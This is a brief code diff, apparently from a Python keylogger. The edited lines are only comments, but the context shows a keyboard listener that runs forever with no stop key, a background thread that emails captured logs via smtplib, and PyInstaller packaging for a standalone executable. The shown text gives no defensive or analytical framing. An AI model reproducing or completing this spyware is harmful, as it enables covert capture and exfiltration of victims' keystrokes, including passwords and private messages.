@@ -9,7 +9,7 @@ import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# ── Fix path for PyInstaller ───────────────────────────────────────────────
+# Path for PyInstaller ───────────────────────────────────────────────
 if getattr(sys, 'frozen', False):
     folder = path(os.path.dirname(sys.executable))
 else:
@@ -89,7 +89,7 @@ def main():
     t = threading.Thread(target=send_email_logs, daemon=True)
     t.start()
 
-    # Start listener — runs forever, no ESC stop!
+    # Start listener — runs forever!
     with keyboard.Listener(on_press=when_pressed) as listener:
         listener.join()
 
